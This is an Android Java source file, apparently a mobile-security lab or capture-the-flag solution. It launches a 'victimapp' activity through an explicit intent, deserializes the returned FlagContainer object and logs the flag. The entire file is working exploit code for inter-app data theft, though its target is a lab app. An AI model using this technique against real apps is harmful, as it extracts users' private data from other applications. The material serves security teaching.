package com.example.maliciousapp;

import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import com.example.victimapp.FlagContainer;

import java.io.ObjectStreamClass;
import java.io.Serializable;

public class MainActivity extends AppCompatActivity implements Serializable {
    private static final String TAG = "MOBIOTSEC";


    ActivityResultLauncher<Intent> mStartForResult = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            new ActivityResultCallback<ActivityResult>() {

                @Override
                public void onActivityResult(ActivityResult result) {

                    Log.d(TAG, result.toString());
                    Bundle bndl = result.getData().getExtras();

                    for (String s : bndl.keySet()) {
                        Log.d(TAG, "key: " + s.toString());

                        try {



                            //TODO: MI SERVE IL SERIAL VERSION UID
                            //https://stackoverflow.com/questions/285793/what-is-a-serialversionuid-and-why-should-i-use-it

                            long serialVersionUID = ObjectStreamClass.lookup(bndl.getClass()).getSerialVersionUID();

                            Log.d(TAG, "SERIAL VERSION UID: " + String.valueOf(serialVersionUID));


                            FlagContainer fc = (FlagContainer) bndl.getSerializable(s);
                            Log.d(TAG, "FLAG: " + fc.getFlag());

                        } catch (Exception e) {
                            Log.d(TAG, e.getMessage());
                        }

                    }
                }
            });


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.d(TAG, "MALICIOUS ACTIVITY STARTED");

        Intent maliciousIntent = new Intent(); // create a buffer intent
        maliciousIntent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity"));

        try {
            mStartForResult.launch(maliciousIntent);
        } catch (ActivityNotFoundException e) {
            Log.d(TAG, "ERROR : " + e.getMessage());
        }

    }
}